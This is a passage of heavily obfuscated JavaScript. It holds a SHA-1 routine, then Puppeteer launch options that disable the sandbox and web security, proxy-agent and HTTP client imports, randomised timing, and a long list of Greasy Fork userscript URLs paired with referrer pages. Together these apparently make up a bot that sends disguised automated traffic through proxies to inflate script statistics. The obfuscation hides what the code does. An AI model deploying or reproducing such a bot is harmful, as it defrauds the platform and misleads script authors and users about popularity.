            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x58f * 0x7 + -0x1bf5 + 0x42e3 | v >>> -0x1a9 + 0x115 + 0xaf) + (w ^ x ^ y) + z + (-0x9d99208b + -0x5613bb4e + 0x16286c77a) + A[q] << 0x11f2 + -0x11 * 0x1d + 0x3 * -0x557) << -0x1ac4 + -0xf4f * 0x1 + -0x3 * -0xe08 | z >>> 0x2 * 0xe3e + 0x1 * 0x1475 + -0x30d6) + (v ^ (w = w << -0xff8 + 0x1dbb + -0xda5 | w >>> 0x16a3 + -0xef * -0x11 + -0x2680) ^ x) + y + (0x589b3a9c + -0xa1 * 0xcda0ed + 0x9790e612) + A[q + (0x1d66 + 0xd0 + 0x13 * -0x197)] << -0x1a99 + -0x4a * 0x2c + 0xb * 0x393) << 0x1 * 0x259f + -0x1de + -0x23bc | y >>> 0xd5b + -0xa6 * -0x17 + 0x5a2 * -0x5) + (z ^ (v = v << -0x1b1 * -0xe + -0x251e + -0xa * -0x15b | v >>> -0x1 * 0x1d6f + -0x25f * 0x1 + -0x3fa * -0x8) ^ w) + x + (0x8a66127f + 0xba47 * 0x12c1d + 0x2321c78f * -0x7) + A[q + (-0x1 * 0x7ab + -0xaa * 0x11 + 0x12f7)] << -0x19cb + 0x4 * -0x7f2 + 0x3993) << -0xb53 * 0x2 + 0x6c8 + -0xfe3 * -0x1 | x >>> -0x1f40 + -0x1 * 0x1907 + 0x3862) + (y ^ (z = z << 0x6e * 0x42 + -0xfcd * 0x2 + 0x35c | z >>> 0x291 * 0xb + 0x1 * -0xcdf + -0x7ad * 0x2) ^ v) + w + (-0xa14a5c41 + -0x8f8a421 * -0x8 + -0x1 * -0xc85f26da) + A[q + (0x1c4f * -0x1 + -0x1d * 0x40 + 0x2392)] << -0x4bd * -0x1 + -0x13ab + 0xeee) << 0xcbe + 0x26 * -0x49 + 0x1 * -0x1e3 | w >>> -0x9a * -0x29 + -0x1 * -0x1d4b + 0x1aed * -0x2) + (x ^ (y = y << -0x2 * 0x1343 + 0x10b5 * -0x2 + 0x322 * 0x17 | y >>> 0x14b1 * 0x1 + -0x2700 + 0x1251) ^ z) + v + (-0x407b5 * 0x175b + 0x55257f89 + 0x77d46c6f) + A[q + (-0x2164 + -0x1838 + 0x39a0)] << 0x1 * -0x7dd + -0x185d + 0xabe * 0x3, x = x << 0x9b3 + 0x1 * -0x2212 + 0x187d | x >>> -0x24fd + 0x1779 * -0x1 + 0x168 * 0x2b;
          for (; q < -0xd97 * -0x1 + 0xa1d * -0x3 + -0x10fc * -0x1; q += -0x25c0 + 0x1cf * -0x11 + 0x4484)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x14c9 + 0x1 * 0xc95 + 0x839 | v >>> -0x1a * -0x5f + 0x24a5 + 0xb8c * -0x4) + (w & x | w & y | x & y) + z - (0x8a1e5dec + 0x1 * -0xd33b32f9 + 0xba011831) + A[q] << 0x18ff * -0x1 + 0x12b1 + 0x327 * 0x2) << -0x10b2 * -0x1 + -0x233c + 0x128f | z >>> -0x1355 + -0xda1 + -0x5 * -0x69d) + (v & (w = w << -0x9c4 + -0x775 + -0xc1 * -0x17 | w >>> -0xf99 + -0x1 * 0x7cf + 0x176a) | v & x | w & x) + y - (-0x58bf7eee + -0x1e8c119 * -0x22 + 0x88ba1cc0) + A[q + (-0x272 * -0xa + -0xb5a * -0x2 + -0x2f27)] << 0xb * -0x1d9 + -0x832 + 0x1c85) << -0x346 * 0x2 + 0x1c9e + 0x469 * -0x5 | y >>> -0x7e6 * -0x3 + 0x9a7 * 0x3 + -0x348c * 0x1) + (z & (v = v << -0x256d + -0x787 * 0x2 + 0x3499 | v >>> 0x17 * 0x199 + 0x1253 + -0x3710 * 0x1) | z & w | v & w) + x - (-0x34d04583 + -0x50190eb5 + -0xb64b4 * -0x1593) + A[q + (0x1 * -0x1d4d + -0x118d + 0x2edc)] << -0x1e85 + 0x34 * -0x4d + 0x2e29) << -0x137 * -0x19 + -0x24e6 + 0x1a3 * 0x4 | x >>> 0x2473 + 0x1 * -0x22d5 + 0x2b * -0x9) + (y & (z = z << 0x1f0d + 0x1920 + -0x380f * 0x1 | z >>> 0xb54 + 0x153b + -0x1 * 0x208d) | y & v | z & v) + w - (0x93cee0f2 + -0x3ee8502a + -0x1a24 * -0x1121f) + A[q + (-0x169f * -0x1 + 0x17ce + -0x2 * 0x1735)] << -0x366 * 0x3 + 0x1881 + -0x63 * 0x25) << -0x1 * 0x1f98 + 0xd9 * -0x25 + 0x3efa | w >>> -0xf21 + -0x9c7 * 0x1 + 0x1903 * 0x1) + (x & (y = y << -0x6 * -0x41d + -0x918 + 0x4 * -0x3de | y >>> 0x15c9 + 0xb3f + -0x2106) | x & z | y & z) + v - (0x44ef697b * 0x2 + -0xdb61a791 + 0xc26717bf) + A[q + (-0x3 * -0xa76 + 0x1ec7 + 0x3e25 * -0x1)] << 0x3e * 0x29 + 0x242d + -0xb * 0x431, x = x << -0xa21 + -0x2 * -0x607 + 0x1cf * -0x1 | x >>> 0x6 * -0x43f + 0x135 + 0x1847 * 0x1;
          for (; q < -0x191 * 0x14 + 0x25cf + 0x1 * -0x62b; q += -0x1 * -0xce7 + 0xaa8 + -0x178a)
            v = (u = (w = (u = (x = (u = (y = (u = (z = (u = v << -0x5 * 0x7f + 0x20fd + -0x1e7d | v >>> 0x1e8b + -0xb3 + 0x14b * -0x17) + (w ^ x ^ y) + z - (-0xf447d * -0x509 + 0x1 * 0x3e5953bb + -0x559beef6) + A[q] << 0xf51 + 0x1aa8 * -0x1 + 0xb57 * 0x1) << 0x4 * -0x4d9 + 0xc8 * -0x26 + 0x3119 | z >>> -0xa1d + 0x1b43 + 0x1 * -0x110b) + (v ^ (w = w << -0x2 * 0xf1a + -0x2 * 0xd0a + 0x3866 | w >>> -0x203d + 0x1ebb * 0x1 + 0x184) ^ x) + y - (-0x551b5a5d + 0x43c * -0xf72cc + 0xcc22b057) + A[q + (0x1492 + -0xbf2 + -0x89f)] << 0x11 * -0xab + 0x503 + 0x658) << -0x10 * -0x13f + -0x1039 + -0x3b2 | y >>> -0x11a5 * -0x2 + -0xfd4 + 0x135b * -0x1) + (z ^ (v = v << -0xe5 * -0x1 + -0x1a22 + 0x195b | v >>> -0x60d * -0x1 + 0x8 * 0x2 + -0x61b) ^ w) + x - (0x23cb3fb * -0x2b + 0xc * 0x11f787f + -0x7447 * -0x12c29) + A[q + (0x10ce + -0x9e * -0x38 + -0x2 * 0x19ae)] << -0xb * -0x10f + 0x23d3 + -0x7c * 0x62) << -0xbb9 + 0x11 * -0xf8 + -0x2 * -0xe1b | x >>> -0x1556 + 0x270b * 0x1 + 0x5de * -0x3) + (y ^ (z = z << 0x3 * -0xbbb + -0x1e52 + 0x41a1 | z >>> 0x998 + 0xd62 + 0x118 * -0x15) ^ v) + w - (0xa * 0x8bc7fa9 + 0x1847197f + -0x3a06d7ef) + A[q + (-0x1c86 * 0x1 + -0x10dd * -0x1 + -0x3 * -0x3e4)] << 0xc87 * -0x3 + 0x231a + 0x1 * 0x27b) << -0x5 * -0x58a + -0x1010 + -0xb9d | w >>> 0xfec + 0x9 * -0x1a0 + -0x131) + (x ^ (y = y << 0x1609 * 0x1 + 0x1 * -0x246b + 0xe80 | y >>> 0x8e * -0x31 + -0x25f * 0x1 + -0x7 * -0x439) ^ z) + v - (0xd * 0x2326f74 + 0xd9 * -0x1bd7d5 + 0x4c6a11 * 0xa3) + A[q + (0xc7 * 0x1f + 0x140f + -0x2c24)] << 0x2db + 0xf3b + 0xa * -0x1cf, x = x << 0x8ec + 0x74c + -0x101a | x >>> 0x633 + -0x37 * -0x14 + 0xb3 * -0xf;
          this['h0'] = this['h0'] + v << -0xf87 + -0x12d6 * -0x1 + 0x7 * -0x79, this['h1'] = this['h1'] + w << 0x189a * 0x1 + 0x1f77 + 0x1cf * -0x1f, this['h2'] = this['h2'] + x << -0x14b4 + 0x2 * 0x8bc + 0x8a * 0x6, this['h3'] = this['h3'] + y << -0xad * 0x1 + -0x1 * -0x48f + -0x7 * 0x8e, this['h4'] = this['h4'] + z << -0x1 * -0x1d3 + -0x4 * 0x662 + 0x33 * 0x77;
        }
        ['hex']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return e[q >> 0x1 * 0x1a6b + -0x29c + -0x1 * 0x17b3 & -0x18c3 + -0x1697 + 0x2f69] + e[q >> 0x99 * -0x39 + 0x1a76 + 0x7b3 & -0x14c3 + 0x46 + 0x148c] + e[q >> -0x14b9 + -0x47 * -0x6b + -0x8e0 & 0xaab + -0x2 * 0x3fb + -0x2a6] + e[q >> -0x87d * 0x1 + 0x1 * -0x1a73 + 0x2300 & -0x175b * 0x1 + 0xdb9 + 0x9b1] + e[q >> 0x7 * 0xf + 0x4 * 0x2be + 0x1 * -0xb55 & 0x69d * -0x1 + 0x8 * -0x361 + 0x21b4] + e[q >> -0x1b99 + -0x1b * -0xd8 + -0x49 * -0x11 & -0x167f + -0x4 * 0x62 + 0x1816] + e[q >> 0xcf8 + 0x8b * 0x18 + 0xcfe * -0x2 & -0x1 * 0x16a7 + -0x7cd + -0x6b * -0x49] + e[0x1 * 0x6f1 + -0x1231 + 0x243 * 0x5 & q] + e[u >> -0x7 * 0x39e + 0x24b * 0x5 + 0xdf7 & 0x22eb * -0x1 + 0x17 * 0x146 + 0x16c * 0x4] + e[u >> -0x2 * 0x2de + -0x3 * -0x4a5 + -0x81b & 0x7 * -0x4d1 + -0xf53 * -0x2 + 0x28 * 0x14] + e[u >> -0x474 + -0x2523 + -0x29ab * -0x1 & 0x1f52 + -0xbf2 + 0x1 * -0x1351] + e[u >> 0xdc3 * -0x1 + 0x7bf * 0x4 + -0x1129 & 0x3d8 + -0x134b + 0xf82] + e[u >> -0x1739 + 0xab8 * -0x3 + 0x7eb * 0x7 & -0xb2 * 0x1e + -0x25 * -0x10b + -0x11ac] + e[u >> -0x1c59 + -0xaad * 0x2 + 0x1d * 0x1b7 & -0x11 * 0x15e + -0x17e * 0x8 + -0x123 * -0x1f] + e[u >> 0x19b0 + -0x7df + -0x5ef * 0x3 & 0x503 * -0x5 + -0x2d9 + 0x1bf7] + e[0x86e + -0x239e + 0x19 * 0x117 & u] + e[v >> -0x17a0 + -0x22b * -0x1 + -0x1 * -0x1591 & -0x1 * 0x216b + 0x1958 + 0x822] + e[v >> 0x454 * -0x6 + -0x1 * 0x16c9 + 0x131 * 0x29 & -0x217e * 0x1 + 0x17c0 + 0x9cd] + e[v >> 0x11e9 * -0x2 + -0x23ed + 0x9 * 0x7fb & -0x23e * -0x3 + -0x24d + 0x56 * -0xd] + e[v >> 0x209b + 0x5b5 * 0x4 + -0x2a3 * 0x15 & -0xf6e + -0x22fe + 0x327b] + e[v >> 0x7 * -0x56 + -0x2 * -0x511 + 0x6 * -0x14a & -0x248b + -0x93f * 0x1 + 0x2dd9] + e[v >> -0xf07 + -0x36d + 0x127c & 0xe * -0xc5 + 0x329 * -0x1 + 0xdfe] + e[v >> 0x1 * 0x15e1 + 0x687 * 0x1 + 0xe32 * -0x2 & -0xfa3 + 0x4e7 + 0xacb] + e[-0x55d * 0x5 + -0xd75 * 0x1 + 0xaf * 0x3b & v] + e[w >> 0x53 + -0x1c2a * 0x1 + 0x1bf3 & 0x1c8 * 0x1 + -0x163f + -0x8e * -0x25] + e[w >> -0x58f + -0x139a + -0x1 * -0x1941 & 0x135f + -0x1b49 + 0x7f9] + e[w >> 0x1ded + -0x1 * -0xdb1 + 0x15c5 * -0x2 & -0x61 * 0x39 + -0x5 * -0x5ad + 0x1 * -0x6b9] + e[w >> -0x16d * -0x1b + 0x23f * 0x1 + -0x28ae & 0xe6 * 0x1a + -0x495 + -0x12b8] + e[w >> -0xa8b + -0x1eb8 + 0x4b * 0x8d & -0x7f + 0x28 * -0x52 + 0x6af * 0x2] + e[w >> -0xd69 + 0x22cf + -0x1 * 0x155e & -0x4fd + -0x35 * -0xad + -0x1ec5] + e[w >> -0x409 * 0x5 + -0xb23 * -0x2 + -0x215 & -0x1 * -0x1105 + -0x23ce * -0x1 + -0x16 * 0x266] + e[0x1b1b * 0x1 + 0x1061 + -0x2b6d & w] + e[x >> 0x1f * -0xd7 + 0x33 * 0x4f + -0x6 * -0x1bc & -0xf49 + 0x2 * -0x272 + 0x5 * 0x40c] + e[x >> -0x1d * 0xea + -0x43 * 0x74 + -0x2e * -0x13d & -0x1e15 * -0x1 + 0x1def + -0x1 * 0x3bf5] + e[x >> 0x3 * 0x45 + 0xffd + -0x358 * 0x5 & -0x649 + 0x1832 + 0x8ed * -0x2] + e[x >> 0x22b6 + -0x1 + -0x22a5 & -0x13b5 + 0x7f * -0x3a + 0x308a] + e[x >> 0x5 * -0x5db + -0x43 * -0xd + -0x15 * -0x13c & 0x4df + 0x26 * 0x67 + -0x2 * 0xa0d] + e[x >> 0xe20 + -0x8b + -0xd8d * 0x1 & -0x138a + 0x2 * 0xe1b + -0x1 * 0x89d] + e[x >> 0x17 * -0x116 + -0x253a + 0x2c * 0x16a & -0x68 * 0x58 + 0x1090 * 0x1 + 0x133f * 0x1] + e[0xa95 + 0xd * 0x3b + -0xd85 & x];
        }
        ['digest']() {
          this['finalize']();
          var q = this['h0'],
            u = this['h1'],
            v = this['h2'],
            w = this['h3'],
            x = this['h4'];
          return [
            q >> 0x5f0 + -0x224a + -0xb * -0x296 & 0x17 * 0xbb + -0x1ef1 + 0xf23,
            q >> -0x2f7 + -0x5e * -0x21 + -0xd * 0xb3 & -0x38 * 0x97 + 0x3e1 + -0x1c6 * -0x11,
            q >> 0xdf3 * 0x1 + -0xf48 + 0x15d & 0x25a1 + 0x17 * -0x73 + -0x1a4d, -0x59a * 0x1 + 0xd * 0x294 + -0x8f9 * 0x3 & q,
            u >> 0xe2 * 0x8 + 0x1f77 + -0x266f & -0x38f * -0x8 + -0xf52 + -0xc27,
            u >> -0x12fd + 0x25e5 + -0x12d8 & 0x533 + -0xfd1 + 0xb9d,
            u >> -0x6d * 0x6 + 0x2 * 0x5f7 + -0x958 & 0x111c + 0x24da * 0x1 + -0x34f7, -0x4 * 0x85a + -0x41b + 0x2682 & u,
            v >> -0x30 * 0xb8 + -0x1281 + -0x45 * -0xc5 & 0x1178 + 0x15 * 0xd + -0xa * 0x1c1,
            v >> 0x1 * -0x68d + 0x3f * -0x6d + -0xd6 * -0x28 & 0x9 * 0x455 + 0x1 * 0x10d5 + 0x23 * -0x191,
            v >> -0x8f4 + 0xe2b + -0x52f & 0x9f * -0x26 + -0x3a * -0x49 + 0x80f * 0x1, -0x3 * -0x153 + 0x3 * 0x69d + -0x289 * 0x9 & v,
            w >> 0x1 * -0xec3 + 0x73f * -0x1 + 0x7b * 0x2e & -0x6b * -0x3d + -0x1 * -0x19e + -0x1a1e,
            w >> -0x2440 + -0x61 * 0x64 + 0x2 * 0x251a & -0x1005 + -0x1ca + -0x967 * -0x2,
            w >> 0x24e + -0x1 * -0xdd9 + -0x101f & 0x770 + 0x77 * 0x4b + -0x294e, -0x244d + 0xce9 + 0x3 * 0x821 & w,
            x >> 0x1312 * -0x2 + -0x2444 + 0x4a8 * 0x10 & 0x10 * -0x34 + -0x26cb + 0x2b0a,
            x >> -0x16f * 0x1 + -0x2492 + 0x2611 & 0x3 * -0xd01 + 0x3 * -0x179 + -0x1 * -0x2c6d,
            x >> -0x1 * -0xb82 + -0x1af0 + 0xf76 & -0x55 * 0x71 + -0x1e68 + 0x4 * 0x113b,
            0x4 * -0x95c + 0x1 * -0x187d + -0x2 * -0x1f76 & x
          ];
        }
        ['arrayBuffe' + 'r']() {
          var q, r;
          return this['finalize'](), q = new ArrayBuffer(-0xba * 0xb + -0x6e * -0x37 + -0x53 * 0x30), (r = new DataView(q))['setUint32'](0x231e + 0x15f5 + -0x3913 * 0x1, this['h0']), r['setUint32'](-0x10ad + 0x89 * -0x3b + 0x3044, this['h1']), r['setUint32'](0x1523 + 0x207d + -0x3598, this['h2']), r['setUint32'](0xd * 0xd5 + 0x238 * 0x8 + -0x1c85, this['h3']), r['setUint32'](0x1934 + 0x1b04 + -0x1a14 * 0x2, this['h4']), q;
        }
    }
    o['prototype']['toString'] = o['prototype']['hex'], o['prototype']['array'] = o['prototype']['digest'];
    const p = k();
    return p;
  })()),
  wait = f => new Promise(g => setTimeout(g, f)),
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil,
    min: min
  } = Math,
  NETWORK_PATIENCE = -0x2479 * -0x2 + -0x23 * -0xd + -0x1 * 0x1bd9 + (-0xee9 + 0x1 * 0x4ee + 0x5 * 0x457) * random(),
  MM_NETWORK_PATIENCE = (-0x21 * 0x129 + 0x186 + 0x24c6) * NETWORK_PATIENCE,
  me = random()['toString'](0x104b + 0x26 * 0x88 + -0x246b)['substring'](0x2ef + -0x1716 + -0x6b9 * -0x3, -0x2616 + 0x1ca4 + 0x97c),
  pptOptions = {
    'headless': 0x0,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ],
    'executablePath': '/../../../' + process['env']['PUPPETEER_' + 'EXECUTABLE' + '_PATH']
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  {
    HttpsProxyAgent: HttpsProxyAgent
  } = require('https-prox' + 'y-agent'),
  data = {
    'scriptTargets': [{
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + aD(0x8) + '-video-id-' + 'text-field',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + aE(0x1a) + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
        'url': 'https://gr' + 'easyfork.o' + aD(0x10) + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
      },
      {
